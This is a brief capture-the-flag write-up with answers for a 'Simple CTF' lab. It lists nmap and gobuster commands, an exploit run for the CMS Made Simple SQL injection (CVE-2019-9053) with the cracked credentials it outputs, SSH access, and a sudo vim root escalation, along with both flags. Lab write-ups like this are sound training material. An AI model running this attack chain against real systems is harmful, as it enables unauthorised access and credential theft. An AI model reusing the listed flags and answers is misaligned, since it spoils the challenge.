# simple ctf

## Task 1 Simple CTF
- How many services are running under port 1000? 2
  ```
  nmap -sC -sV 10.10.69.130 -T4

  ssh port 2222
  ```
- What is running on the higher port? ssh
- What's the CVE you're using against the application? CVE-2019-9053
  ```
  gobuster dir -u 10.10.69.130 -w /usr/share/worldlist/rockyou.txt

  go /simple
  check cms made simple, and check goggle the cv
  ```
- To what kind of vulnerability is the application vulnerable? sqli
- What's the password? secret
  ```
  install the exploit.py
  and convert python2 to python3

  and run

  python3 cv-cms3.py -u http://10.10.69.130/simple -w rockyou.txt

  [+] Salt for password found: 1dac0d92e9fa6bb2
  [+] Username found: mitch
  [+] Email found: admin@admin.com
  [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96k
  [+] Password cracked: secret
  ```
- Where can you login with the details obtained? ssh
- What's the user flag? G00d j0b, keep up!
- Is there any other user in the home directory? What's its name? sunbath
- What can you leverage to spawn a privileged shell? vim
  ```
  sudo -l
  (root) NOPASSWD: /usr/bin/vim

  gtfobins > vim > sudo
  ```
- What's the root flag?
  ```
  W3ll d0n3. You made it!
  ```